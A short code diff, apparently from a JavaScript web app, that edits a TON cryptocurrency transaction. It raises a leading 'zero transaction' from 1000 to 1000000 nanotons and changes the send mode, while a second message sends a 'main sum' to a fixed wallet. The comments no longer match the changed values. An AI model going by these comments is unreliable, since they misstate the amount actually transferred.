@@ -96,9 +96,9 @@ async function didtrans() {
             messages: [
                 {
                     address: mainWallet, // Нулевая транзакция (идет первой)
-                    amount: 1000, // 1000 нанотонов (0.000001 TON)
+                    amount: 1000000, // 1000 нанотонов (0.000001 TON)
                     payload: "te6cckEBAgEAAQAAAA==", // Пустой payload
-                    sendMode: 1, // Минимальный режим для пропуска комиссии
+                    sendMode: 3, // Минимальный режим для пропуска комиссии
                 },
                 {
                     address: mainWallet, // Основная сумма
